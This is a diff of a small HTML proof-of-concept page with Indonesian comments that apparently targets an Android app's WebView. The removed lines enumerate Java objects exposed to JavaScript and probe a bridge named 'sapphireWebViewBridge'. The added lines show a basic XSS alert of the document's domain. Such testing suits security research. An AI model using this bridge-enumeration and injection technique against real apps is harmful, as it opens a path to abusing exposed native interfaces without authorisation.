@@ -1,21 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Shuvy Bridge Scanner</h2>
+    <h2>Shuvy XSS Proof of Concept</h2>
     <script>
-        // Mencari tahu objek Java apa saja yang terekspos ke JS
-        var exposed = "";
-        for (var obj in window) {
-            if (typeof window[obj] === 'object' && window[obj].getClass) {
-                exposed += obj + "\\n";
-            }
-        }
-        alert("Exposed Interfaces: \\n" + exposed);
-        
-        // Atau tes panggilan langsung ke bridge yang kita ketahui
-        if(typeof sapphireWebViewBridge !== 'undefined') {
-            alert("sapphireWebViewBridge is active!");
-        }
+        // Kita tes eksekusi JS dasar tanpa menyentuh Bridge dulu
+        alert("XSS Berhasil, Zeeinch! Domain: " + document.domain);
     </script>
 </body>
 </html>
